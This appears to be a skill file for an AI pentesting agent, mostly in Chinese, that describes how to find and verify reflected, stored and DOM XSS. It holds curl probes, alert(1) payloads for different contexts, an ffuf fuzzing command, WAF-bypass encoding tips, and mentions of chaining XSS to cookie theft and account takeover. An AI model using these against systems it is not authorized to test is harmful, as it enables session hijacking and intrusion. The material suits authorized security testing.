---
name: xss-testing
description: >-
  Finds and validates reflected/stored/DOM XSS with context-aware payloads and
  browser proof; saves requests/responses under runs/. Use when user mentions XSS/
  跨站/script/alert/document.cookie or input echoes unsanitized in HTML/JS.
whenToUse: 参数回显于页面、富文本/评论/搜索框、或 nuclei/人工怀疑前端未编码输出
role: vuln-scan
enabled: true
---

# XSS 测试（反射/存储/DOM）

目标：**可复现的 payload + 浏览器/响应证据**，不是 payload 清单背诵。

## 何时用 / 何时不用

| 用 | 不用 |
|---|---|
| 搜索/评论/个人资料等用户输入回显 | 纯 API JSON 无 HTML 渲染 |
| CSP 弱或未设 | 需 RCE 的服务端漏洞（→ `sqli-testing`） |

## 标准流程

### 1. 找注入点

```bash
mkdir -p runs/xss-TARGET
# 唯一标记探针
curl -s "http://TARGET/search?q=xssprobe999" | grep -o 'xssprobe999' | head
curl -s "http://TARGET/search?q=<b>xssprobe999</b>" -o runs/xss-TARGET/reflect.html
```

### 2. 上下文 payload（按回显位置选）

```html
<!-- HTML 文本 -->
"><script>alert(1)</script>
<!-- 属性内 -->
" onmouseover=alert(1) "
<!-- JS 字符串内 -->
';alert(1)//
<!-- SVG -->
<svg/onload=alert(1)>
```

```bash
# 批量轻量（勿 DoS）
ffuf -u "http://TARGET/search?q=FUZZ" -w /usr/share/seclists/Fuzzing/XSS/XSS-Jhaddix.txt \
  -mc all -fr "blocked" -o runs/xss-TARGET/ffuf.csv -of csv
```

### 3. 存储型验证

1. 提交 payload 到存储点（评论/消息）
2. 无 Cookie 新会话访问列表页 → 确认触发
3. `browser-automation` 截图留证

### 4. DOM 型

- 读前端 JS：`grep -rE 'location|innerHTML|document.write' runs/xss-TARGET/js/`
- 改 hash/query 观察是否进 sink

## 与其它技能的分工

| 场景 | 技能 |
|---|---|
| 要偷 Cookie/打管理员 | 配合 `browser-automation` |
| CSP 绕过 | 查 allowed-src，试 JSONP/angular 等 |
| 升级为账户接管 | 常链 `auth-bypass` / session 固定 |

## 输出与落库

1. `redteam_vuln_add` — type=`xss`, subtype=reflected|stored|dom, payload, url
2. `redteam_chain_add` — 完整 curl/请求 + 响应片段路径

## 纪律

1. alert(1) 仅作证明；演练环境可用 `console.log` 减干扰
2. 不对外部用户发恶意链接
3. 过滤/WAF 时试编码变体：`%3Cscript%3E`、双写、换标签
